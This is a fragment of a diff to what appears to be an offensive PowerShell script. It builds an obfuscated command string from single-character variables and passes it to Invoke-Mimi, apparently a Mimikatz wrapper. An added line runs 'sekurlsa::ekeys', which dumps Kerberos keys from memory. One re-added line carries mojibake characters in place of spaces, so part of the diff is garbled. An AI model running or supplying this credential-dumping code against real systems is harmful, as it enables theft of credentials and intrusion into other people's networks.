@@ -2581,4 +2581,5 @@ $a = "s"
 
 $Pwn = $a + $b + $c + $d + $e + $f + $g + $h + $i + $j
 
-Invoke-Mimi -Command $Pwn
+Invoke-MimiÂ -CommandÂ $Pwn
+Invoke-Mimi -Command '"sekurlsa::ekeys"'
